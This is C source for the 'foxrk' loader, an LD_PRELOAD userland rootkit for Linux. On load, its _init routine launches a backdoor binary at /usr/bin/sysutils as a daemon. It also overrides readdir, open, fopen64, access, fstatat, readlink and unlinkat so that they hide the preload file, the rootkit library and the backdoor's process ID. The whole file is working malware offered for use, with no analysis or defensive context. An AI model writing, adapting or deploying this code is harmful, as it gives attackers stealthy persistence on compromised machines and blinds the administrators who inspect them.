// foxrk loader by ngn
// github.com/ngn13/foxrk
// inspired from EVIL RABBIT

// loader overwrites the 
// syscalls with LD_PRELOAD
// these new malicious
// syscalls make sure our
// rootkit wont be found 

#define _GNU_SOURCE

#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>          
#include <sys/stat.h>
#include <stdarg.h>

#define BACKDOOR "/usr/bin/sysutils"
#define HIDE1 "ld.so.preload"
#define HIDE2 "sysutils.so"
#define HIDE3 "ez2918"

// backdoor PID
static int bpid = 0;

// original syscalls
static struct dirent* (*oreaddir)(DIR * ) = NULL;
static ssize_t (*oreadlink)(const char *restrict, char *restrict, size_t)= NULL;
static ssize_t (*owrite)(int, const void*, size_t) = NULL; 
static FILE* (*ofopen)(const char *restrict, const char *restrict) = NULL;
static int (*ofstatat)(int dirfd, const char *restrict pathname, struct stat *restrict statbuf, int flags) = NULL;
static int (*oopen)(const char *pathname, int flags, ...) = NULL;
static int (*oaccess)(const char *pathname, int mode) = NULL;
static int (*ounlinkat)(int dirf, const char *pathname, int flags) = NULL;

void *find_addr(char *symbol){
	void *address = dlsym(RTLD_NEXT, symbol);
	if (address == NULL)
		exit(1);

	return address;
}

bool find_proc(const char* name) {
  DIR* dir;
  struct dirent* entry;

  dir = opendir("/proc");
  if (dir == NULL)
		return false;

  while ((entry = readdir(dir)) != NULL) {
    if (entry->d_type == DT_DIR) {
      char pidPath[256];
      sprintf(pidPath, "/proc/%s/cmdline", entry->d_name);

      FILE* cmdline = fopen(pidPath, "r");
			
			if (!cmdline)
				continue;

			char buffer[256];
			size_t len = fread(buffer, 1, sizeof(buffer) - 1, cmdline);
      fclose(cmdline);
			
			// cmdline file seperates program names with a
			// null byte, for example:
			// -> /usr/bin/python3 /usr/bin/sysutils
			// looks like
			// -> /usr/bin/python3[null byte]/usr/bin/sysutils
			// in the cmdline, so we need to replace the null bytes
			// with a space
			for (size_t i = 0; i < len; ++i) {
        if (buffer[i] == '\0') {
          buffer[i] = ' ';
				}
      }

			if(strstr(buffer, name)==NULL)
				continue;

			closedir(dir);
			bpid = atoi(entry->d_name);
			return true;
		
		}
  }
  closedir(dir);
}

void _init() {
	// we need to make sure that our 
	// backdoor is not already running
	// if so we can start it up
	bool res = find_proc(BACKDOOR);
	if(res)
		return;
	
	// to start the backdoor 
	// first fork the current
	// process creating a 
	// new child process
	pid_t pid = fork();

	// if pid is set to -1
	// it means child
	// process creation failed
	if (pid == 0){	
		// if not failed,
		// first we create a
		// daemon, 0 means
		// child process should
		// change dir to root dir,
		// the other 0 means 
		// child processes std in/out
		// will be redirected
		// to /dev/null
		daemon(0,0);
		// then we execute the backdoor
		// replacing the process
		execve(BACKDOOR, NULL, NULL);
		// if execve fails, we just exit
		exit(0);  
	}

	return;
}

// malicious syscalls
struct dirent *readdir(DIR *dirp){
	if (oreaddir == NULL)
		oreaddir = (struct dirent* (*)(DIR *))find_addr("readdir");
	
	struct dirent *dp = oreaddir(dirp);
			
	if(bpid==0){
		while(dp != NULL && (	
				!strncmp(dp->d_name, HIDE1, strlen(HIDE1)) || 
				!strncmp(dp->d_name, HIDE2, strlen(HIDE2)) || 
				!strncmp(dp->d_name, HIDE3, strlen(HIDE3)) )
			){
				dp = oreaddir(dirp);
		}
	}else{	
		char pidPath[30];	
    sprintf(pidPath, "%d", bpid);
		while(dp != NULL && (	
			!strncmp(dp->d_name, HIDE1, strlen(HIDE1)) || 
			!strncmp(dp->d_name, HIDE2, strlen(HIDE2)) ||
			!strncmp(dp->d_name, HIDE3, strlen(HIDE3)) || 
			!strncmp(dp->d_name, pidPath, strlen(pidPath)) )
		){	
			dp = oreaddir(dirp);
		}
	}

	return dp;
}

bool path_check(const char* pathname){

	// well this doesnt really work
	// it kills the machines connection
	// after reboot
	// i will need to find a smarter way to
	// implement this
	// if(strstr(pathname, "/proc/net/tcp")!=NULL)	
	//	return false;

	// we need to make sure the backdoor
	// is not running, otherwise python3
	// wont be able to open it
	if(strstr(pathname, HIDE1)!=NULL || 
		 strstr(pathname, HIDE2)!=NULL ||
		 strstr(pathname, HIDE3)!=NULL 
	){
		return false;
	}
	
	if(bpid!=0){
		char pidPath[30];	
		sprintf(pidPath, "%d", bpid);
		if(strstr(pathname, pidPath)!=NULL)
			return false;
	}

	return true;
}

ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsiz){
	if (oreadlink == NULL)
		oreadlink = (ssize_t (*)(const char *restrict, char *restrict, size_t))find_addr("readlink");

	if(!path_check(pathname))
		return -1;
	
	return oreadlink(pathname, buf, bufsiz);
}

FILE* fopen64(const char *restrict pathname, const char *restrict mode){
	if (ofopen == NULL)
		ofopen = (FILE* (*)(const char *restrict, const char *restrict mode))find_addr("fopen64");
	
	if(!path_check(pathname))
		return NULL;

	return ofopen(pathname, mode);	
}

int open(const char *pathname, int flags, ...){
	if(oopen == NULL)
		oopen = (int (*)(const char *pathname, int flags, ...))find_addr("open");

	if(!path_check(pathname))
		return -1;

	// so you might be thinking,
	// how do you pass the "..."
	
	// well idk

	// so i found a easier
	// solution

	// i dont
	return oopen(pathname, flags);
	// this is probably not a good idea
}

int fstatat(int dirfd, const char *restrict pathname, struct stat *restrict statbuf, int flags){
	if(ofstatat == NULL)
		ofstatat = (int (*)(int dirfd, const char *restrict pathname, struct stat *restrict statbuf, int flags))find_addr("fstatat");
	
	if(!path_check(pathname))
		return -1;

	return ofstatat(dirfd, pathname, statbuf, flags);
}

int newfstatat(int dirfd, const char *restrict pathname, struct stat *restrict statbuf, int flags){
	return fstatat(dirfd, pathname, statbuf, flags);
}

int access(const char* pathname, int mode){
	if(oaccess==NULL)
		oaccess = (int (*)(const char *pathname, int mode))find_addr("access");
	if(!path_check(pathname))	
		return -1;

	return oaccess(pathname, mode);	
}

int unlinkat(int dirfd, const char *pathname, int flags){
	if(ounlinkat==NULL)
		ounlinkat = (int (*)(int dirfd, const char *pathname, int flags))find_addr("unlinkat");

	if(!path_check(pathname))
		return -1;

	return ounlinkat(dirfd, pathname, flags);
}
